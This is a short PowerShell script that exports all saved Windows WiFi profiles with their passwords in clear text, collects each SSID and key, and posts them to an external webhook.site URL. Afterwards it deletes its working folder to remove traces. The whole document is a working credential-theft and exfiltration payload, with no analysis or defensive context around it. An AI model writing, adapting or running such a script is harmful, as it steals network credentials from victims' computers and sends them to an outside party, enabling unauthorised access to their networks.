$webhookUrl = "https://webhook.site/3e30b3d0-304b-4218-b056-44158ad60822"
$tempPath = "$env:TEMP\wifidump"

Write-Host "1. Starting script..." -ForegroundColor Cyan
New-Item -ItemType Directory -Force -Path $tempPath | Out-Null
Set-Location $tempPath

Write-Host "2. Exporting WiFi profiles..." -ForegroundColor Yellow
netsh wlan export profile key=clear | Out-Null

$wifiData = ""
Get-ChildItem -Filter *.xml | ForEach-Object {
    [xml]$xml = Get-Content $_.FullName
    $ssid = $xml.WLANProfile.SSIDConfig.SSID.name
    $password = $xml.WLANProfile.MSM.Security.sharedKey.keymaterial
    if ($password) {
        $wifiData += "SSID: $ssid | Password: $password`n"
    }
}

if ($wifiData -ne "") {
    Write-Host "3. Data found! Sending to webhook..." -ForegroundColor Green
    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $wifiData -ContentType "text/plain"
        Write-Host "4. Data sent successfully!" -ForegroundColor Green
    } catch {
        Write-Host "ERROR during sending:" -ForegroundColor Red
        Write-Host $_.Exception.Message -ForegroundColor Red
    }
} else {
    Write-Host "3. No WiFi data found. Are you running as Admin?" -ForegroundColor Red
}

Set-Location $env:TEMP
Remove-Item -Path $tempPath -Recurse -Force
